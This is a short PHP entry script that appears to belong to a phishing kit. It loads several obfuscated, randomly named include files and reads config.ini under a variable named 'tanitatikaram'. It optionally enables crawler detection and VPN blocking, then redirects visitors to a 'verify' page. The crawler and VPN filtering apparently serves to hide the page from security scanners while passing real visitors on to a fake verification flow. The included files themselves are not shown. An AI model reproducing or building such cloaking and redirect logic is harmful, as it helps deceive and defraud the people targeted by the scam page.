<?php
require_once 'dAsQH7TJ4Jk8Eukn.php';
$tanitatikaram = parse_ini_file("config.ini", true);
$setting_crawlerdetect = $tanitatikaram['setting_crawlerdetect'];
if ($setting_crawlerdetect == 'on') {
    require_once 'crawlerdetect.php';
}
require_once '78MhStYkx0gUYL4m.php';
$tanitatikaram = parse_ini_file("config.ini", true);
$setting_vpn = $tanitatikaram['setting_vpn'];
if ($setting_vpn == 'on') {
    require_once 'SfnZqYH0LCSzlXoC.php';
}
require_once 'N55U0DLENwqKvrr9.php';
require_once 'e/LkQUeQHMtwG2kxe9.php';
session_start();
header("Location: verify/index.php");